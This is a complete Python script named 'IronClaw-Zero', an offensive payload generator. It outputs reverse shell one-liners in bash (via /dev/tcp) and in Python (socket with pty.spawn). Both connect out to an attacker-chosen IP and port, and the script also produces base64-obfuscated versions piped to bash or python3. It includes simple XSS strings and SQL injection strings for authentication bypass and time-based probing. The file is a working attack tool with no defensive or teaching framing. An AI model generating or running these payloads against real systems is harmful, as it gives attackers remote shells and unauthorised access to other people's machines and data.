#!/usr/bin/env python3

# IronClaw-Zero: Custom Payload Generator
import argparse
import base64
import sys

def generate_bash_revshell(ip, port):
    payload = f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"
    encoded = base64.b64encode(payload.encode()).decode()
    return {
        "description": "Standard Bash Reverse Shell",
        "raw": payload,
        "encoded": f"echo {encoded} | base64 -d | bash"
    }

def generate_python_revshell(ip, port):
    payload = f"""python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'"""
    encoded = base64.b64encode(payload.encode()).decode()
    return {
        "description": "Python3 Reverse Shell",
        "raw": payload,
        "encoded": f"echo {encoded} | base64 -d | python3"
    }

def generate_xss(context="alert"):
    if context == "alert":
        return {"description": "Basic XSS Alert", "payload": "<script>alert('IronClaw-Zero')</script>"}
    elif context == "img":
        return {"description": "XSS Image Vector", "payload": "<img src=x onerror=alert('IronClaw-Zero')>"}

def generate_sqli(type="auth_bypass"):
    if type == "auth_bypass":
        return {"description": "SQLi Auth Bypass", "payload": "admin' OR '1'='1"}
    elif type == "time":
        return {"description": "SQLi Time-Based", "payload": "'; WAITFOR DELAY '0:0:5'--"}

def main():
    parser = argparse.ArgumentParser(description="IronClaw-Zero Payload Generator")
    parser.add_argument("--type", choices=['revshell', 'xss', 'sqli'], required=True, help="Type of payload to generate")
    parser.add_argument("--ip", help="Reverse shell listener IP")
    parser.add_argument("--port", help="Reverse shell listener Port")
    parser.add_argument("--context", default="alert", help="Context for XSS/SQLi")
    
    args = parser.parse_args()

    print("[+] IronClaw-Zero Payload Generator\n")
    
    if args.type == 'revshell':
        if not args.ip or not args.port:
            print("[-] Error: --ip and --port are required for revshell")
            sys.exit(1)
        print("1. Bash Payload:")
        print(generate_bash_revshell(args.ip, args.port))
        print("\n2. Python Payload:")
        print(generate_python_revshell(args.ip, args.port))
        
    elif args.type == 'xss':
        print(generate_xss(args.context))
        
    elif args.type == 'sqli':
        print(generate_sqli(args.context))

if __name__ == "__main__":
    main()
